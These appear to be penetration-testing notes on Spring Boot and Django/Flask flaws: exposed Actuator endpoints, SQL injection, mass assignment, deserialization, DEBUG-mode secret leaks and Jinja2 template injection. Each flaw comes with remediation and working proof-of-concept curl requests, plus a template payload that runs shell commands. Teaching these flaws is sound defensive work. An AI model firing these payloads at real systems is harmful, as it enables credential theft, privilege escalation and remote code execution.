Taint flow model is covered in [[Offensive JavaScript]]

---

# Java / Spring Boot

## Actuator Misconfiguration

**Where to look**

```properties
management.endpoints.web.exposure.include=*
```

Any value other than a tight allow-list (e.g. `health,info`) means Actuator endpoints — `/env`, `/heapdump`, `/mappings`, `/beans`, `/httptrace` — may be exposed. `/env` and `/heapdump` are the highest-value targets (secrets, credentials, session data).

**PoC**

```bash
curl -s http://vulnerable-site.com/actuator | jq
curl -s http://vulnerable-site.com/actuator/env | jq
curl -s http://vulnerable-site.com/actuator/heapdump -o heapdump.bin
```

**Remediation**: explicitly whitelist only the endpoints needed (`include=health,info`), and put Actuator behind auth / a separate management port.

---

## SQL Injection

**Vulnerable pattern**

```java
String sql = "SELECT id, title, body FROM articles WHERE title = '" + q + "'";
```

`q` is concatenated directly into the query string with no sanitization or parameter binding.

**Safe pattern (for comparison)**

Spring's `JdbcTemplate` parameterizes queries automatically when arguments are passed separately rather than concatenated:

```java
jdbcTemplate.query("SELECT id, title, body FROM articles WHERE title = ?", rowMapper, q);
```

If you see string concatenation feeding into `Statement`/`createQuery`/native queries instead of `PreparedStatement`/bound parameters, it's exploitable.

**Remediation**: always use parameterized queries (`PreparedStatement`, JPA named parameters, or `JdbcTemplate` with bound args) — never string-build SQL from user input.

---

## Mass Assignment

**Vulnerable entity**

```java
@Entity
@Table(name = "users")
public class User {
    private Long id;
    private String username;
    private String password;
    private String email;
    private String role = "USER";
    // getters and setters
}
```

**Vulnerable endpoint**

```java
@PostMapping("/account/update")
public String update(@ModelAttribute User user, HttpSession session) {
    Long uid = (Long) session.getAttribute("uid");
    if (uid == null) return "redirect:/account/login";

    User existing = users.findById(uid).orElse(null);
    if (existing == null) return "redirect:/account/login";

    user.setId(uid);
    user.setUsername(existing.getUsername());
    user.setPassword(existing.getPassword());
    users.save(user);
    return "redirect:/account/profile";
}
```

The profile form only renders an `email` field client-side, but `@ModelAttribute` binds against every field on `User`. Since `id`, `username`, and `password` are explicitly overwritten server-side but `role` is **not**, an attacker can smuggle `role=ADMIN` into the POST body.

**PoC**

```bash
curl -s -X POST http://vulnerable-site.com/account/update \
  -b "JSESSIONID=<session>" \
  -d "email=me@example.com&role=ADMIN"
```

**Remediation**: bind to a dedicated DTO that only exposes the fields the endpoint should accept (e.g. `UserUpdateRequest { email }`), never the full entity.

---

## Insecure Deserialization

**Vulnerable pattern**

```java
byte[] data = Base64.getDecoder().decode(body);
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
    Object obj = ois.readObject();   // <-- sink
}
```

**Other Java sinks worth knowing**

- `XStream.fromXML()`
- `java.beans.XMLDecoder.readObject()`
- Any framework doing implicit deserialization of untrusted input (e.g. RMI, JMX, some cache/session backends)

The sink alone isn't enough to get RCE — you also need a **gadget chain** on the classpath. Check `pom.xml` / `build.gradle` for known-exploitable libraries and their versions, most commonly `commons-collections`, but also `commons-beanutils`, `spring-core` (via specific gadgets), and `groovy`. Tools like `ysoserial` generate payloads for known chains.

**Remediation**: never deserialize untrusted data with native Java serialization. Use a safe format (JSON) with an allow-listed deserializer, or `ObjectInputFilter` if native serialization is unavoidable.

---

# Python

## Django `DEBUG` Mode + Exposed `SECRET_KEY`

**Vulnerable pattern**

```python
SECRET_KEY = os.environ.get("APP_SECRET_KEY", "<hardcoded-fallback>")
DEBUG = True
```

`DEBUG = True` in production renders full stack traces (including settings values) on unhandled exceptions. A hardcoded fallback in `SECRET_KEY` means the key leaks even if the env var was never set — and a leaked `SECRET_KEY` breaks session signing, CSRF tokens, and password reset tokens.

**PoC**

```bash
curl -s http://vulnerable-site.com/error/ | grep -m 1 -o 'SECRET_KEY=[^ <]*'
```

**Remediation**: `DEBUG = False` in production, `SECRET_KEY` from a secrets manager with no fallback default, and rotate the key if it was ever exposed.

---

## Django SQL Injection

Django's ORM parameterizes every query it builds through the standard QuerySet API. The risk is in the escape hatches that bypass the ORM and don't auto-parameterize unless you do it explicitly:

```python
.extra(where=[...])
.raw("...")
cursor.execute("...")
```

Any of the above built via string concatenation/f-strings with user input is injectable. All three support parameterized args (`params=[...]`) — if you see raw string formatting instead, it's a finding.

**Remediation**: avoid `.extra()` (deprecated) and `.raw()`/`cursor.execute()` with string-built SQL; always pass user input via the `params` argument for placeholder substitution.

---

## Jinja2 SSTI (Server-Side Template Injection)

**Vulnerable pattern**

```python
template = PAGE_HEAD + q + PAGE_TAIL
return render_template_string(template)
```

User input `q` is concatenated directly into the template source *before* rendering, rather than being passed in as render context data. This lets an attacker inject Jinja2 syntax that gets evaluated server-side.

**Confirming**

Inject `{{7*7}}` into the input field — a vulnerable server reflects `49` instead of the literal string.

**Escalating**

From confirmed SSTI, the usual path to RCE goes through Python's object model, e.g.:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

(exact gadget depends on Jinja2/Flask version and available builtins)

**Remediation**: never build template *source* from user input. Pass user input as render context (`render_template_string(FIXED_TEMPLATE, q=q)`) so it's treated as data, not template code. Use `SandboxedEnvironment` as defense-in-depth, not as a primary control.
